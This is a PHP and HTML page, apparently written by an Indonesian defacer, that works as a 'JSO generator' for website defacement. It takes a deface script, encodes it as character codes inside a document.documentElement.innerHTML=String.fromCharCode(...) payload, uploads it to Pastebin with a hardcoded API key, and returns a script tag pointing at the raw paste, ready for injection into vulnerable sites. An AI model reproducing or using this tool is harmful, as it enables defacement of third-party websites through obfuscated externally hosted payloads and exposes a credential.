<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta http-equiv="X-UA-Compatible" content="ie=edge">
    <title>JSO Generator</title>
	<link href="https://fonts.googleapis.com/css?family=Fredoka+One&display=swap" rel="stylesheet">
	<link href="https://fonts.googleapis.com/css?family=Caveat&display=swap" rel="stylesheet">
	<script type="text/javascript">
		function copy_text() {
			document.getElementById("pilih").select();
			document.execCommand("copy");
			alert("Text berhasil dicopy zeyenk");
		}
	</script>
	<style>
	body {
		background-color:#2C3A49;
		color:white;
		font-family: 'Fredoka One', cursive;
	}
	.head {
		font-family: 'Fredoka One', cursive;
		text-shadow: 4px 1px red;
	}
	.textarea {
		width: 200px;
		height: 100px;
		border-radius: 10px;
		border-style: unset;
	}
	.btn {
		border-radius: 3px;
		background-color: white;
		border-style: unset;
		font-family: 'Fredoka One', cursive;
	}
	.foot {
		font-family: 'Caveat', cursive;
		text-shadow: 4px 1px red;
	}
	.ress {
		font-size: 20px;
    	color: aqua;
		font-family: 'Fredoka One', cursive;
	}
	</style>
    <script>
		function runCharCodeAt() {
			input = document.charCodeAt.input.value;
			output = "";
			for(i=0; i<input.length; ++i) {
				if (output != "") output += ", ";
				output += input.charCodeAt(i);
			}
			document.charCodeAt.output.value = output;
		}
	</script>
</head>
<body>
<center>
<h1 class="head">Tools Jso Generator</h1>
<form name="charCodeAt" method="post">
		<textarea name="input" class="textarea" placeholder="Script Deface Lu Taroh Sini Zeyenk:3"></textarea><br><br>
		<input type="button" onclick="runCharCodeAt()" value="Convert" class="btn"><br><br>
		<textarea name="output" class="textarea"></textarea><br><br>
		<input type="submit" name="submit" value="Create" class="btn"><br><br>
</form>
<?php 

if (isset($_POST['submit'])) {
	if (empty($_POST['output'])) {
		echo "<script>alert('Convert Dulu Zeyenk:3');</script>";
	}else{

$isi = $_POST['output'];
$random = rand(1, 99999999);
$api_dev_key 			= '633fcbdacbff82bfd5dd821a9f8921f7'; // your api_developer_key
$api_paste_code 		= "document.documentElement.innerHTML=String.fromCharCode(".$isi.")"; // your paste text
$api_paste_private 		= '0'; // 0=public 1=unlisted 2=private
$api_paste_name			= $random; // name or title of your paste
$api_paste_expire_date 		= 'N';
$api_paste_format 		= 'text';
$api_user_key 			= ''; // if an invalid or expired api_user_key is used, an error will spawn. If no api_user_key is used, a guest paste will be created
$api_paste_name			= urlencode($api_paste_name);
$api_paste_code			= urlencode($api_paste_code);

$url 				= 'https://pastebin.com/api/api_post.php';
$ch 				= curl_init($url);

curl_setopt($ch, CURLOPT_POST, true);
curl_setopt($ch, CURLOPT_POSTFIELDS, 'api_option=paste&api_user_key='.$api_user_key.'&api_paste_private='.$api_paste_private.'&api_paste_name='.$api_paste_name.'&api_paste_expire_date='.$api_paste_expire_date.'&api_paste_format='.$api_paste_format.'&api_dev_key='.$api_dev_key.'&api_paste_code='.$api_paste_code.'');
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_VERBOSE, 1); 
curl_setopt($ch, CURLOPT_NOBODY, 0);

$response  			= curl_exec($ch);
$hasil = str_replace('https://pastebin.com', 'https://pastebin.com/raw', $response);
$respak = '<script type="text/javascript" src="'.$hasil.'"></script>';
$kk = htmlspecialchars($respak);
echo "<h1 class='ress'>Result:</h1>";
echo "<input type='text' value='$kk' id='pilih' readonly />";
echo "<button type='button' onclick='copy_text()'>Copy</button>";
}}
echo "<h2 class='foot'>@2k19 Coded By Nor Ahmad</h2>";

?>

</body>
</html>
